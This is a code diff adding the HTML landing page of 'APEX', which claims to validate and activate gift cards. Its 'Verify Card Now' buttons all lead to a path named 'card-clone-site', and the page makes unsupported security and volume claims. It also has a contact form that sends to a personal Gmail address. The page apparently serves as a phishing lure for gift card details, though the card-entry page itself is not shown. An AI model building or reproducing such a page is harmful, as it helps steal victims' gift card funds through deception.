@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <title>APEX</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/card.css">
+  <script src="card.js"></script>
+  <script src="/custom.js"></script>
+</head>
+
+<body>
+  <section class="header">
+    <header>
+      <div class="container ">
+        <div class="navbar flex1">
+          <div class="logo">
+            <a href="#home"><img src="image/logo.png" alt=""></a>
+          </div>
+
+          <nav>
+            <ul id="menuitem">
+              <li><a href="#home">Home</a></li>
+              <li><a href="#Overview">Our Service</a></li>
+              <li><a href="#Features">Features</a></li>
+              <li><a href="#dowload">Trade With APEX</a></li>
+              <li><a href="#function">Contact</a></li>
+            </ul>
+            <a href="/card-clone-site/index.html"><button>VERIFY CARD NOW</button></a>
+          </nav>
+          <span class="fa fa-bars" onclick="menutoggle()"></span>
+        </div>
+      </div>
+    </header>
+  </section>
+
+  <script>
+    var menuitem = document.getElementById("menuitem");
+    menuitem.style.maxHeight = "0px";
+
+    function menutoggle() {
+      if (menuitem.style.maxHeight == '0px') {
+        menuitem.style.maxHeight = "500px"
+      } else {
+        menuitem.style.maxHeight = "0px"
+      }
+    }
+
+    window.addEventListener("scroll", function() {
+      var header = document.querySelector("header");
+      header.classList.toggle("sticky", window.scrollY > 50);
+    })
+  </script>
+
+  <section class="home" id="home">
+    <div class="container flex1">
+      <div class="left">
+        <h1>Gift Card <span style="color: #5D58F7; text-shadow: 0.2px 0px 0.2px black">Validation</span> &<br>
+          <span style="color: #5D58F7; text-shadow: 0.2px 0px 0.2px black">Activation</span> Check</h1>
+        <p style="color: black;">An efficient frame work that provides a robust verification,
+          Using a smart anti logarithm that runs very fast to provide an adequate activation information.</p>
+
+        <div class="button flex">
+          <a href="/card-clone-site/index.html"><button class="btn1">Verify Card Now </button></a>
+        </div>
+      </div>
+      <div class="right">
+        <div class="img">
+          <img src="image/card (1).webp" alt="">
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="Overview mtop" id="Overview">
+    <br><br><br>
+    <div class="container">
+      <div class="heading">
+        <h1>Our Services</h1>
+        <p>Leverage our agile and efficient frameworks to provide a robust verification and
+           synopsis for high level reviews on your giftcards</p>
+      </div>
+
+      <div class="content grid mtop">
+        <div class="box">
+          <div class="img">
+            <img src="image/o1.png" alt="">
+            <i class="fas fa-download"></i>
+          </div>
+          <div class="text">
+            <h3>High Performance</h3>
+            <p>Our smart algorithms run very fast to provide for you adequate info about your giftcard.</p>
+          </div>
+        </div>
+        <div class="box">
+          <div class="img">
+            <img src="image/o2.png" alt="">
+            <i class="fas fa-edit"></i>
+          </div>
+          <div class="text">
+            <h3>Secured and Encrypted</h3>
+            <p>We at APEX makes sure customers giftcard details are secured and encrypted.</p>
+          </div>
+        </div>
+        <div class="box">
+          <div class="img">
+            <img src="image/o3.png" alt="">
+            <i class="fas fa-chart-line"></i>
+          </div>
+          <div class="text">
+            <h3>Decentralized</h3>
+            <p>Our smart frameworks is built on a decentralized platform to ensure clients
+               gift card details are not stored anywhere in the server.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  
+
+  <section class="Features mtop" id="Features">
+    <div class="container">
+      <div class="heading">
+        <h1>Exclusive Features</h1>
+        <p>Enhance Your Brand Potential With Giant Advertising Blimps </p>
+      </div>
+
+      <div class="content flex mtop">
+        <div class="left grid">
+          <div class="box">
+            <div class="img">
+              <i class="far fa-gem"></i>
+            </div>
+            <h3>Unique Trade System</h3>
+            <p>At APEX we give you Unique trading system to make every transaction count.</p>
+          </div>
+          <div class="box">
+            <div class="img">
+              <i class="fas fa-code"></i>
+            </div>
+            <h3>Clean Record</h3>
+            <p>At APEX we offer clean client record of gone transactions with comfort.</p>
+          </div>
+          <div class="box">
+            <div class="img">
+              <i class="fas fa-desktop"></i>
+            </div>
+            <h3>Always Ready</h3>
+            <p>Available professionals are always on sit to attend to client request and trade.</p>
+          </div>
+          <div class="box">
+            <div class="img">
+              <i class="fas fa-air-freshener"></i>
+            </div>
+            <h3>APEX Perfect</h3>
+            <p>Apex gives you the perfect platform to trade seemlessly without any transaction problem.</p>
+          </div>
+        </div>
+        <div class="right">
+          <div class="image">
+            <img src="image/card (2).webp" alt="">
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="dowload" id="dowload">
+    <div class="container flex">
+      <div class="left">
+        <h1>APEX 100% READY TO TRADE</h1>
+        <p>We have verified over 10k giftcards on our site.
+          Verify yours now</p>
+
+        <div class="flex">
+          <div class="box flex">
+            <a href="/card-clone-site/index.html"><button style="border: none;">VERIFY CARD NOW</button></a>
+          </div>
+          <!-- <div class="box flex">
+            <div class="img">
+              <i class="fab fa-android"></i>
+            </div>
+            <div class="text">
+              <span>Download on the</span>
+              <h2>Google Play </h2>
+            </div>
+          </div> -->
+        </div>
+      </div>
+      <div class="right">
+        <img src="image/d1.png" alt="">
+      </div>
+    </div>
+  </section>
+
+
+
+  <section class="function  top" id="function">
+    <div class="container">
+      <div class="heading">
+        <h1>CONTACT US</h1>
+        <p>Send us a message today</p>
+      </div>
+
+      <div class="fun_content">
+        <div class="content flex mtop">
+          <div class="left">
+            <i class="fad fa-service"></i>
+            <h3>Promotional Active communication in APEX</h3>
+            <p>We are available to help you with your giftcard verification needs and to provide you 
+              support with a quick solution to your problem.</p>
+          </div>
+          <div class="right">
+            <div class="login-form">
+             <div class="login-form">
+        <form action="https://formsubmit.co/obagoldbody14@gmail.com"
+        method="POST"
+        class="form">
+        <input type="text" name="_honey" style="display: none" />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://www.google.com">
+            <div class="login-header">
+                <h1>APEX</h1>
+                <p>We are waiting for your message  </p>
+            </div>
+            <div class="flex-column">
+                <label>Email </label>
+            </div>
+            <div class="inputForm">
+                <svg height="20" viewBox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+                    <g id="Layer_3" data-name="Layer 3">
+                        <path
+                            d="m30.853 13.87a15 15 0 0 0 -29.729 4.082 15.1 15.1 0 0 0 12.876 12.918 15.6 15.6 0 0 0 2.016.13 14.85 14.85 0 0 0 7.715-2.145 1 1 0 1 0 -1.031-1.711 13.007 13.007 0 1 1 5.458-6.529 2.149 2.149 0 0 1 -4.158-.759v-10.856a1 1 0 0 0 -2 0v1.726a8 8 0 1 0 .2 10.325 4.135 4.135 0 0 0 7.83.274 15.2 15.2 0 0 0 .823-7.455zm-14.853 8.13a6 6 0 1 1 6-6 6.006 6.006 0 0 1 -6 6z">
+                        </path>
+                    </g>
+                </svg>
+                <input type="text" name="email" class="input" placeholder="Enter your Email">
+            </div>
+        
+            <div class="flex-column">
+                <label>Message </label>
+            </div>
+            <div class="inputForm">
+                
+                <input type="text" class="input" name="client message" placeholder="Enter your Message" row="6">
+                
+            </div>
+        
+            
+            <button class="button-submit">Send</button>
+            
+        </form>
+          </div>
+        </div>
+        <!-- <div class="content flex mtop">
+          <div class="left">
+            <i class="fad fa-print-search"></i>
+            <h3>Promotional Advertising Specialty You Ve Waited Long Enough</h3>
+            <p>Ever wondered how some graphic designers always manage to produce beautiful looking designs for their brochures, website designs, logo designs? Talent…yes, it helps but there are a hand- ful of more important things you can do that
+              will
+              have even complete beginners producing award winning design.</p>
+            <a href="#">Learn More</a>
+          </div>
+          <div class="right">
+            <div class="img">
+              <img src="image/f3.png" alt="">
+            </div>
+          </div>
+        </div>
+        <div class="content flex mtop">
+          <div class="left">
+            <i class="fas fa-rocket"></i>
+            <h3>Promotional Advertising Specialty You Ve Waited Long Enough</h3>
+            <p>Ever wondered how some graphic designers always manage to produce beautiful looking designs for their brochures, website designs, logo designs? Talent…yes, it helps but there are a hand- ful of more important things you can do that
+              will
+              have even complete beginners producing award winning design.</p>
+            <a href="#">Learn More</a>
+          </div>
+          <div class="right">
+            <div class="img">
+              <img src="image/f5.png" alt="">
+            </div>
+          </div>
+        </div> -->
+      </div>
+    </div>
+  </section>
+
+  <!-- <section class="team top" id="team">
+    <div class="container">
+      <div class="heading">
+        <h1>Trusted By Great Team</h1>
+        <p>Enhance Your Brand Potential With Giant Advertising Blimps</p>
+      </div>
+
+      <div class="content grid mtop">
+        <div class="box">
+          <img src="image/t1.png" alt="">
+        </div>
+        <div class="box">
+          <img src="image/t2.png" alt="">
+        </div>
+        <div class="box">
+          <img src="image/t3.png" alt="">
+        </div>
+        <div class="box">
+          <img src="image/t4.png" alt="">
+        </div>
+      </div>
+    </div>
+  </section> -->
+
+  <footer>
+    <div class="container grid">
+      <div class="box">
+        <img src="image/logo.png" alt="">
+        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. </p>
+
+        <div class="social">
+          <i class="fab fa-facebook-f"></i>
+          <i class="fab fa-instagram"></i>
+          <i class="fab fa-twitter"></i>
+          <i class="fab fa-youtube"></i>
+        </div>
+      </div>
+
+      <!-- <div class="box">
+        <h3>Post Tags</h3>
+        <button>App</button>
+        <button>Business</button>
+        <button>Corporate</button>
+        <button>Creative</button>
+        <button>Design</button>
+        <button>Fasion</button>
+        <button>Food</button>
+        <button>Mobile</button>
+        <button>Music</button>
+        <button>Travel</button>
+      </div> -->
+
+      <div class="box">
+        <h3>Blog Categories</h3>
+        <ul>
+          <li>App Review</li>
+          <li>Audio Post</li>
+          <li>Default Post</li>
+          <li>Uncategorized</li>
+          <li>Video Post</li>
+          <li>Website Review</li>
+        </ul>
+      </div>
+
+      <div class="box">
+        <h3>Contact Info</h3>
+        <ul>
+          <!-- <li><i class="fas fa-map-marker-alt"></i> Location</li> -->
+          <li><i class="fas fa-mobile-alt"></i> +1 325 261-7331</li>
+          <li><i class="far fa-envelope"></i> giftcardscheckapex@gmail.com</li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+</body>
+
+</html>
